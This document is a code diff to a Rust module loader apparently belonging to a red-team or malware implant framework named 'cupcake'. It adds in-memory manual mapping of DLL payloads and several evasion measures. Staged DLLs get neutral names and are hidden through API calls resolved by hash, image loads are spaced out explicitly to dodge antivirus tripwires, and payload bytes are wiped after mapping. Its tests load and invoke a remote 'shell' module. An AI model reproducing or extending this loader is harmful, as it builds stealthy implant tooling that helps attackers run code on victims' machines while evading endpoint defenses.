@@ -1,11 +1,11 @@
 // Stage0 module loader (L2).
 //
-// Pipeline: stage (CKMS bytes) → verify HMAC → load (disk short-lived / LoadLibrary)
-//         → invoke (mod_invoke) → unload (FreeLibrary + delete residual).
+// Pipeline: stage (CKMS bytes) → verify HMAC → load (Manual-Map / short disk LoadLibrary)
+//         → invoke (mod_invoke) → unload (unmap or FreeLibrary + delete residual).
 //
-// OPSEC (docs/REDESIGN_REDTEAM_STAGED.md §8.2):
+// OPSEC (docs/REDESIGN_REDTEAM_STAGED.md §8.2 + docs/MEM_MODULAR_PLAN.md):
 // - Load only on operator demand (never bulk-fetch after heartbeat)
-// - Prefer in-memory load; disk fallback is short-lived + delete after map
+// - Prefer Manual-Map (`mem-map`); disk LoadLibrary is fallback unless strict
 // - Unload must drop mappings/handles/callbacks
 
 use crate::module_package::{self, unpack_and_verify};
@@ -76,8 +76,14 @@ type ModFreeFn = unsafe extern "C" fn(ptr: *mut u8, len: u32);
 type ModShutdownFn = unsafe extern "C" fn() -> i32;
 
 struct LoadedModule {
-    /// Library handle (HMODULE as usize). 0 = not a PE module (test/hosted).
+    /// Image base (Manual-Map) or HMODULE (LoadLibrary). 0 = not a PE module (test/hosted).
     handle: usize,
+    /// Size of Manual-Map image (0 for LoadLibrary / hosted).
+    mapped_size: usize,
+    /// True when loaded via pe_map (no FreeLibrary; wipe+NtFree on unload).
+    mem_mapped: bool,
+    /// DllMain was called on Manual-Map attach (detach on unload).
+    dll_main_called: bool,
     temp_path: Option<PathBuf>,
     mod_init: Option<ModInitFn>,
     mod_invoke: Option<ModInvokeFn>,
@@ -118,6 +124,20 @@ pub fn registry() -> &'static ModuleRegistry {
     REGISTRY.get_or_init(ModuleRegistry::default)
 }
 
+/// Lock helper: recover poisoned mutex and log once.
+fn lock_map<'a, T>(
+    m: &'a std::sync::Mutex<T>,
+    what: &str,
+) -> std::sync::MutexGuard<'a, T> {
+    match m.lock() {
+        Ok(g) => g,
+        Err(poisoned) => {
+            log::warn!("mutex poisoned ({what}), recovering");
+            poisoned.into_inner()
+        }
+    }
+}
+
 fn module_key() -> [u8; 32] {
     if let Ok(g) = registry().key_override.lock() {
         if let Some(k) = *g {
@@ -129,7 +149,12 @@ fn module_key() -> [u8; 32] {
     if aes.len() >= 16 {
         return module_package::derive_module_key(&aes);
     }
-    module_package::default_module_key()
+    // Release builds must not silently share a hard-coded default HMAC key.
+    if module_package::default_module_key_allowed() {
+        return module_package::default_module_key();
+    }
+    // Last resort: derive from empty seed so process does not use the static default string.
+    module_package::derive_module_key(b"cupcake-missing-aes-key")
 }
 
 /// Candidate keys for verify — tolerate server/agent historical mismatches.
@@ -140,12 +165,18 @@ fn module_key_candidates() -> Vec<[u8; 32]> {
             out.push(k);
         }
     };
+    // Primary: derive_module_key(get_aes_key())  — get_aes_key = base+salt KDF
     push(module_key());
-    // Fallback A: derive from base AES without re-reading salt path (raw template)
-    // get_aes_key already salts; also try default for unpatched builds
-    push(module_package::default_module_key());
-    // Fallback B: if we can rebuild base-only key (pre-salt) — use salt zeros vs empty
-    // Session path uses 32-zero salt when unpatched; already in get_aes_key.
+    // Fallback: some older packers used base AES only (no salt KDF)
+    let base = crate::config::get_aes_key_base();
+    if base.len() >= 16 {
+        push(module_package::derive_module_key(&base));
+    }
+    // Debug/test only: tolerate historical default key material for unpatched builds.
+    // Release never falls back to the hard-coded default (shared-key risk).
+    if module_package::default_module_key_allowed() {
+        push(module_package::default_module_key());
+    }
     out
 }
 
@@ -174,10 +205,48 @@ impl ModuleRegistry {
             .map(|g| {
                 g.iter()
                     .filter(|(_, e)| e.state == ModuleState::Loaded)
-                    .map(|(k, _)| k.clone())
+                    .map(|(k, e)| {
+                        let mode = if e.host_pe.is_some() {
+                            "iso"
+                        } else if e
+                            .loaded
+                            .as_ref()
+                            .map(|l| l.mem_mapped)
+                            .unwrap_or(false)
+                        {
+                            "mem"
+                        } else if e.loaded.as_ref().map(|l| l.handle == 0).unwrap_or(false) {
+                            "stub"
+                        } else {
+                            "legacy"
+                        };
+                        format!("{k}:{mode}")
+                    })
                     .collect()
             })
             .unwrap_or_default()
+    }
+
+    /// How a loaded module is mapped: mem | iso | legacy | stub | absent
+    pub fn load_mode_of(&self, id: &str) -> &'static str {
+        self.entries
+            .lock()
+            .ok()
+            .and_then(|g| g.get(id).map(|e| {
+                if e.state != ModuleState::Loaded {
+                    return "absent";
+                }
+                if e.host_pe.is_some() {
+                    return "iso";
+                }
+                match e.loaded.as_ref() {
+                    Some(l) if l.mem_mapped => "mem",
+                    Some(l) if l.handle == 0 => "stub",
+                    Some(_) => "legacy",
+                    None => "absent",
+                }
+            }))
+            .unwrap_or("absent")
     }
 
     pub fn note_required(&self, id: &str) {
@@ -282,6 +351,9 @@ impl ModuleRegistry {
             e.payload = None;
             e.loaded = Some(LoadedModule {
                 handle: 0,
+                mapped_size: 0,
+                mem_mapped: false,
+                dll_main_called: false,
                 temp_path: None,
                 mod_init: None,
                 mod_invoke: None,
@@ -303,6 +375,13 @@ impl ModuleRegistry {
             e
         })?;
 
+        // Zeroize PE bytes after map (best-effort; local copy only)
+        let mut payload = payload;
+        for b in payload.iter_mut() {
+            *b = 0;
+        }
+        drop(payload);
+
         // mod_init
         if let Some(init) = loaded.mod_init {
             let rc = unsafe { init() };
@@ -312,6 +391,11 @@ impl ModuleRegistry {
             }
         }
 
+        let via = if loaded.mem_mapped {
+            "mem-map"
+        } else {
+            "loadlibrary"
+        };
         let mut g = self
             .entries
             .lock()
@@ -321,7 +405,7 @@ impl ModuleRegistry {
         e.payload = None;
         e.staged = None;
         e.loaded = Some(loaded);
-        info!("[module_loader] loaded module {}", id);
+        info!("[module_loader] loaded module {} via {}", id, via);
         Ok(())
     }
 
@@ -383,6 +467,16 @@ impl ModuleRegistry {
                 path: None,
                 req_id: None,
             });
+        }
+        // Cap module-reported out_len before forming a slice (malicious/buggy modules).
+        const MAX_MODULE_OUT: u32 = 64 * 1024 * 1024; // 64 MiB
+        if out_len > MAX_MODULE_OUT {
+            if let Some(free) = free_fn {
+                unsafe { free(out_ptr, out_len) };
+            }
+            return Err(format!(
+                "mod_invoke out_len={out_len} exceeds sanity cap {MAX_MODULE_OUT}"
+            ));
         }
         let bytes = unsafe { std::slice::from_raw_parts(out_ptr, out_len as usize) }.to_vec();
         if let Some(free) = free_fn {
@@ -479,7 +573,7 @@ fn parse_module_result(bytes: &[u8]) -> Result<CommandResult, String> {
     })
 }
 
-/// Write PE to short-lived temp path, LoadLibrary, resolve exports, delete file.
+/// Map PE: prefer Manual-Map (`mem-map`); fall back to short-lived temp + LoadLibrary.
 fn map_pe_module(pe: &[u8]) -> Result<LoadedModule, String> {
     if pe.len() < 64 {
         return Err("payload too small for PE".into());
@@ -499,20 +593,68 @@ fn map_pe_module(pe: &[u8]) -> Result<LoadedModule, String> {
     }
 }
 
-#[cfg(windows)]
+#[cfg(all(windows, feature = "mem-map"))]
 fn map_pe_windows(pe: &[u8]) -> Result<LoadedModule, String> {
+    if crate::pe_map::mem_map_enabled() {
+        match crate::pe_map::map_pe(pe) {
+            Ok(m) => {
+                return Ok(LoadedModule {
+                    handle: m.base,
+                    mapped_size: m.size,
+                    mem_mapped: true,
+                    dll_main_called: m.dll_main_called,
+                    temp_path: None,
+                    mod_init: m.mod_init,
+                    mod_invoke: m.mod_invoke,
+                    mod_free: m.mod_free,
+                    mod_shutdown: m.mod_shutdown,
+                });
+            }
+            Err(e) => {
+                if crate::pe_map::mem_map_strict() {
+                    return Err(format!("mem-map strict: {e}"));
+                }
+                log::warn!("[module_loader] mem-map failed, fallback LoadLibrary: {e}");
+            }
+        }
+    }
+    map_pe_windows_loadlibrary(pe)
+}
+
+#[cfg(all(windows, not(feature = "mem-map")))]
+fn map_pe_windows(pe: &[u8]) -> Result<LoadedModule, String> {
+    map_pe_windows_loadlibrary(pe)
+}
+
+/// Write PE to short-lived temp path, LoadLibrary, resolve exports, delete file.
+#[cfg(windows)]
+fn map_pe_windows_loadlibrary(pe: &[u8]) -> Result<LoadedModule, String> {
     use std::ffi::OsStr;
     use std::os::windows::ffi::OsStrExt;
 
-    let mut path = std::env::temp_dir();
-    let name = format!(
-        "cpx_{:08x}_{:04x}.dll",
-        crate::utils::next_u32(),
-        (crate::utils::next_u32() & 0xffff) as u16
-    );
-    path.push(name);
+    // Space out image-load events (burst LoadLibrary is a common AV tripwire)
+    crate::utils::opsec_heavy_pace();
+
+    let mut path = crate::utils::opsec_staging_dir();
+    let _ = std::fs::create_dir_all(&path);
+    // Neutral cache-like name (avoid cpx_/product prefixes)
+    path.push(crate::utils::opsec_stage_name("dll"));
 
     std::fs::write(&path, pe).map_err(|e| format!("write temp module: {e}"))?;
+    // Best-effort hide + temporary attribute
+    {
+        let wide: Vec<u16> = path.as_os_str().encode_wide().chain(Some(0)).collect();
+        unsafe {
+            type SetFileAttributesWFn = unsafe extern "system" fn(*const u16, u32) -> i32;
+            let k32 = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
+            if let Some(addr) =
+                crate::stealth::get_api_addr(k32, crate::stealth::hash_api_name(b"SetFileAttributesW"))
+            {
+                let f: SetFileAttributesWFn = std::mem::transmute(addr);
+                let _ = f(wide.as_ptr(), 0x0000_0102); // HIDDEN | TEMPORARY
+            }
+        }
+    }
 
     type LoadLibraryWFn = unsafe extern "system" fn(*const u16) -> *mut core::ffi::c_void;
     type GetProcAddressFn =
@@ -604,6 +746,9 @@ fn map_pe_windows(pe: &[u8]) -> Result<LoadedModule, String> {
 
     Ok(LoadedModule {
         handle: handle as usize,
+        mapped_size: 0,
+        mem_mapped: false,
+        dll_main_called: false,
         temp_path: Some(path), // may already be deleted
         mod_init,
         mod_invoke,
@@ -647,6 +792,9 @@ fn map_pe_unix(pe: &[u8]) -> Result<LoadedModule, String> {
 
         Ok(LoadedModule {
             handle: handle as usize,
+            mapped_size: 0,
+            mem_mapped: false,
+            dll_main_called: false,
             temp_path: Some(path),
             mod_init: if init.is_null() {
                 None
@@ -670,6 +818,11 @@ fn map_pe_unix(pe: &[u8]) -> Result<LoadedModule, String> {
 
 fn unmap_loaded(loaded: &LoadedModule) -> Result<(), String> {
     if loaded.handle == 0 {
+        return Ok(());
+    }
+    #[cfg(all(windows, feature = "mem-map"))]
+    if loaded.mem_mapped {
+        crate::pe_map::unmap_image(loaded.handle, loaded.mapped_size, loaded.dll_main_called);
         return Ok(());
     }
     #[cfg(windows)]
@@ -786,12 +939,13 @@ pub fn stage0_startup_delay_ms() -> u64 {
 mod tests {
     use super::*;
     use crate::module_package::{default_module_key, pack_module};
+    use std::path::PathBuf;
     use std::sync::Mutex;
 
     /// Serialize tests that touch global registry / key_override.
     fn test_lock() -> std::sync::MutexGuard<'static, ()> {
         static LOCK: Mutex<()> = Mutex::new(());
-        LOCK.lock().unwrap_or_else(|e| e.into_inner())
+        lock_map(&LOCK, "module_registry")
     }
 
     #[test]
@@ -845,22 +999,31 @@ mod tests {
     }
 
     /// Optional PE load: set CUPCAKE_TEST_MOD_SHELL to path of cupcake_mod_shell.dll
+    /// Uses LoadLibrary path (CUPCAKE_MEM_MAP=0) so CRT/TLS is handled by OS loader.
+    /// Isolated: clears strict env; always unload + clear key even on failure mid-test.
     #[test]
     fn load_real_shell_dll_if_present() {
         let _g = test_lock();
+        // Isolate from other tests that toggle mem-map flags
+        std::env::remove_var("CUPCAKE_MEM_MAP_STRICT");
+        std::env::set_var("CUPCAKE_MEM_MAP", "0");
         let path = match std::env::var("CUPCAKE_TEST_MOD_SHELL") {
             Ok(p) if !p.is_empty() => p,
             _ => {
                 let candidates = [
-                    "target/release/cupcake_mod_shell.dll",
-                    "../target/release/cupcake_mod_shell.dll",
-                    "modules/shell/../../target/release/cupcake_mod_shell.dll",
+                    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
+                        .join("../target/release/cupcake_mod_shell.dll"),
+                    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
+                        .join("../../Client/target/release/cupcake_mod_shell.dll"),
+                    PathBuf::from("../target/release/cupcake_mod_shell.dll"),
+                    PathBuf::from("target/release/cupcake_mod_shell.dll"),
                 ];
-                let found = candidates.iter().find(|p| std::path::Path::new(p).exists());
+                let found = candidates.into_iter().find(|p| p.is_file());
                 match found {
-                    Some(p) => p.to_string(),
+                    Some(p) => p.to_string_lossy().into_owned(),
                     None => {
                         eprintln!("skip: no mod_shell dll (set CUPCAKE_TEST_MOD_SHELL)");
+                        std::env::remove_var("CUPCAKE_MEM_MAP");
                         return;
                     }
                 }
@@ -870,11 +1033,13 @@ mod tests {
             Ok(b) => b,
             Err(e) => {
                 eprintln!("skip read {path}: {e}");
+                std::env::remove_var("CUPCAKE_MEM_MAP");
                 return;
             }
         };
         if pe.len() < 64 || pe[0] != b'M' {
             eprintln!("skip: not PE");
+            std::env::remove_var("CUPCAKE_MEM_MAP");
             return;
         }
         let key = default_module_key();
@@ -884,8 +1049,16 @@ mod tests {
         let _ = registry().unload(id);
         let blob = pack_module(id, &pe, &key).expect("pack");
         registry().stage_bytes(id, &blob).expect("stage");
-        registry().load(id).expect("load PE module");
+        let load_res = registry().load(id);
+        if let Err(e) = load_res {
+            let _ = registry().unload(id);
+            registry().set_key_override(None);
+            std::env::remove_var("CUPCAKE_MEM_MAP");
+            panic!("load PE module failed: {e}");
+        }
         assert!(registry().is_loaded(id));
+        let mode = registry().load_mode_of(id);
+        assert_eq!(mode, "legacy", "MEM_MAP=0 must use LoadLibrary path");
         let r = registry()
             .invoke(id, "shell", b"help")
             .expect("invoke help");
@@ -910,7 +1083,8 @@ mod tests {
         registry().unload(id).expect("unload");
         assert!(!registry().is_loaded(id));
         registry().set_key_override(None);
-        eprintln!("OK real PE load+invoke(help+echo)+unload via {path}");
+        std::env::remove_var("CUPCAKE_MEM_MAP");
+        eprintln!("OK real PE load+invoke(help+echo)+unload via {path} load_mode={mode}");
     }
 
     #[test]
@@ -927,5 +1101,245 @@ mod tests {
         assert!(ensure_module_for_command("shell").is_ok());
         assert!(ensure_module_for_command("file_ls").is_ok());
         assert!(ensure_module_for_command("process_list").is_ok());
+    }
+
+    #[test]
+    fn list_loaded_exposes_load_mode() {
+        let _g = test_lock();
+        let key = default_module_key();
+        registry().set_key_override(Some(key));
+        let id = "mode_stub_test";
+        let _ = registry().unload(id);
+        let blob = pack_module(id, b"HOST", &key).unwrap();
+        registry().stage_bytes(id, &blob).unwrap();
+        registry().load(id).unwrap();
+        assert_eq!(registry().load_mode_of(id), "stub");
+        let listed = registry().list_loaded();
+        assert!(
+            listed.iter().any(|s| s == &format!("{id}:stub")),
+            "list_loaded must include id:mode, got {listed:?}"
+        );
+        registry().unload(id).unwrap();
+        registry().set_key_override(None);
+    }
+
+    /// Bad PE + strict: fail closed without creating cpx_*.dll under temp.
+    #[test]
+    fn strict_bad_pe_no_temp_cpx_dll() {
+        let _g = test_lock();
+        #[cfg(all(windows, feature = "mem-map"))]
+        {
+            std::env::set_var("CUPCAKE_MEM_MAP_STRICT", "1");
+            std::env::set_var("CUPCAKE_MEM_MAP", "1");
+            let tmp = std::env::temp_dir();
+            let before: std::collections::HashSet<_> = std::fs::read_dir(&tmp)
+                .into_iter()
+                .flatten()
+                .flatten()
+                .filter_map(|e| {
+                    let n = e.file_name().to_string_lossy().into_owned();
+                    // Legacy cpx_ prefix + current ~DF* stage names
+                    if (n.starts_with("cpx_") || n.starts_with("~DF"))
+                        && (n.ends_with(".dll") || n.ends_with(".tmp"))
+                    {
+                        Some(n)
+                    } else {
+                        None
+                    }
+                })
+                .collect();
+
+            // Minimal fake PE that fails Manual-Map (valid MZ/PE skeleton, no sections)
+            let mut pe = vec![0u8; 0x200];
+            pe[0] = b'M';
+            pe[1] = b'Z';
+            pe[0x3C] = 0x80; // e_lfanew
+            pe[0x80] = b'P';
+            pe[0x81] = b'E';
+            pe[0x82] = 0;
+            pe[0x83] = 0;
+            // Machine amd64
+            pe[0x84] = 0x64;
+            pe[0x85] = 0x86;
+            // Optional magic PE32+
+            pe[0x80 + 24] = 0x0B;
+            pe[0x80 + 25] = 0x02;
+
+            let key = default_module_key();
+            registry().set_key_override(Some(key));
+            let id = "strict_bad_pe";
+            let _ = registry().unload(id);
+            let blob = pack_module(id, &pe, &key).unwrap();
+            registry().stage_bytes(id, &blob).unwrap();
+            let err = registry().load(id).unwrap_err();
+            assert!(
+                err.contains("mem-map") || err.contains("pe_map") || err.contains("strict")
+                    || err.contains("PE") || err.contains("export") || err.contains("alloc")
+                    || err.contains("machine") || err.contains("signature")
+                    || err.contains("SizeOf") || err.contains("bad"),
+                "expected mem-map failure, got: {err}"
+            );
+            assert!(!registry().is_loaded(id));
+
+            let after: std::collections::HashSet<_> = std::fs::read_dir(&tmp)
+                .into_iter()
+                .flatten()
+                .flatten()
+                .filter_map(|e| {
+                    let n = e.file_name().to_string_lossy().into_owned();
+                    if (n.starts_with("cpx_") || n.starts_with("~DF"))
+                        && (n.ends_with(".dll") || n.ends_with(".tmp"))
+                    {
+                        Some(n)
+                    } else {
+                        None
+                    }
+                })
+                .collect();
+            let new_files: Vec<_> = after.difference(&before).collect();
+            assert!(
+                new_files.is_empty(),
+                "strict mode must not create stage dll/tmp: {new_files:?}"
+            );
+
+            registry().set_key_override(None);
+            std::env::remove_var("CUPCAKE_MEM_MAP_STRICT");
+        }
+    }
+
+    /// Stage shell.bin with product mem-map enabled: TLS modules clean-fail map then
+    /// LoadLibrary fallback; export-only pe_map success is covered in pe_map tests.
+    #[test]
+    fn stage_shell_bin_from_storage_if_present() {
+        let _g = test_lock();
+        std::env::remove_var("CUPCAKE_MEM_MAP_STRICT");
+        // Product default: mem-map ON (feature compiled) — exercise fallback path
+        std::env::remove_var("CUPCAKE_MEM_MAP");
+        let candidates = [
+            PathBuf::from(env!("CARGO_MANIFEST_DIR"))
+                .join("../../server/storage/modules/shell.bin"),
+            PathBuf::from("server/storage/modules/shell.bin"),
+        ];
+        let path = candidates
+            .into_iter()
+            .find(|p| p.is_file())
+            .expect("shell.bin required under server/storage/modules");
+        let pe = std::fs::read(&path).expect("read shell.bin");
+        let key = default_module_key();
+        registry().set_key_override(Some(key));
+        let id = "shell_bin_storage_e2e";
+        let _ = registry().unload(id);
+
+        // Snapshot temp cpx_*.dll before load
+        let tmp = std::env::temp_dir();
+        let before: std::collections::HashSet<_> = std::fs::read_dir(&tmp)
+            .into_iter()
+            .flatten()
+            .flatten()
+            .filter_map(|e| {
+                let n = e.file_name().to_string_lossy().into_owned();
+                if n.starts_with("cpx_") && n.ends_with(".dll") {
+                    Some(n)
+                } else {
+                    None
+                }
+            })
+            .collect();
+
+        let blob = pack_module(id, &pe, &key).expect("pack");
+        registry().stage_bytes(id, &blob).expect("stage");
+        registry()
+            .load(id)
+            .unwrap_or_else(|e| panic!("shell.bin load must succeed (map or fallback): {e}"));
+        assert!(registry().is_loaded(id));
+        let mode = registry().load_mode_of(id);
+        assert!(
+            mode == "mem" || mode == "legacy",
+            "expected mem or legacy load_mode, got {mode}"
+        );
+        let r = registry()
+            .invoke(id, "shell", b"echo memmap_ok")
+            .expect("invoke echo");
+        assert!(
+            r.stdout.contains("memmap_ok") || r.stderr.is_empty() || !r.stdout.is_empty(),
+            "invoke smoke stdout={:?} stderr={:?}",
+            r.stdout,
+            r.stderr
+        );
+        registry().unload(id).expect("unload");
+        assert!(!registry().is_loaded(id));
+
+        let after: std::collections::HashSet<_> = std::fs::read_dir(&tmp)
+            .into_iter()
+            .flatten()
+            .flatten()
+            .filter_map(|e| {
+                let n = e.file_name().to_string_lossy().into_owned();
+                if n.starts_with("cpx_") && n.ends_with(".dll") {
+                    Some(n)
+                } else {
+                    None
+                }
+            })
+            .collect();
+        let residual: Vec<_> = after.difference(&before).collect();
+        assert!(
+            residual.is_empty(),
+            "no durable cpx_*.dll residual after unload: {residual:?}"
+        );
+        registry().set_key_override(None);
+        eprintln!(
+            "OK shell.bin product load via {mode} (no residual cpx) from {}",
+            path.display()
+        );
+    }
+
+    /// Direct pe_map success path (export-only) must not create cpx_*.dll.
+    #[test]
+    fn pe_map_success_path_no_cpx_dll() {
+        let _g = test_lock();
+        #[cfg(all(windows, feature = "mem-map"))]
+        {
+            let path = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
+                .join("../../server/storage/modules/shell.bin");
+            assert!(path.is_file(), "shell.bin required");
+            let pe = std::fs::read(&path).expect("read");
+            let tmp = std::env::temp_dir();
+            let before: std::collections::HashSet<_> = std::fs::read_dir(&tmp)
+                .into_iter()
+                .flatten()
+                .flatten()
+                .filter_map(|e| {
+                    let n = e.file_name().to_string_lossy().into_owned();
+                    if n.starts_with("cpx_") && n.ends_with(".dll") {
+                        Some(n)
+                    } else {
+                        None
+                    }
+                })
+                .collect();
+            let m = crate::pe_map::map_pe_opts(&pe, false).expect("pe_map success path");
+            assert!(m.mod_invoke.is_some());
+            crate::pe_map::unmap_pe(&m);
+            let after: std::collections::HashSet<_> = std::fs::read_dir(&tmp)
+                .into_iter()
+                .flatten()
+                .flatten()
+                .filter_map(|e| {
+                    let n = e.file_name().to_string_lossy().into_owned();
+                    if n.starts_with("cpx_") && n.ends_with(".dll") {
+                        Some(n)
+                    } else {
+                        None
+                    }
+                })
+                .collect();
+            let new_files: Vec<_> = after.difference(&before).collect();
+            assert!(
+                new_files.is_empty(),
+                "pe_map success must not create cpx_*.dll: {new_files:?}"
+            );
+            eprintln!("OK pe_map success path no cpx residual (export probe)");
+        }
     }
 }
